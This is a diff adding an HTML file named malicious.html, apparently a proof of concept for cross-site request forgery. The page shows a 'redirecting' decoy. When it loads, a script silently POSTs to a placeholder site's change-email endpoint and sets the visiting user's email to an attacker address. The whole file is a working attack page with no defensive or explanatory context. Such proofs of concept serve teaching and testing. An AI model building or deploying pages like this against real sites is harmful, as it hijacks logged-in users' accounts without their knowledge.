@@ -1,0 +1,20 @@
+<!-- malicious.html -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack</title>
+</head>
+<body>
+    <h1>Welcome!</h1>
+    <p>You are being redirected...</p>
+    <script>
+        // This script sends a request to change the email on behalf of the user
+        document.addEventListener('DOMContentLoaded', function() {
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'http://vulnerable-website.com/change-email', true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.send('email=attacker@example.com'); // Change email to attacker's email
+        });
+    </script>
+</body>
+</html>
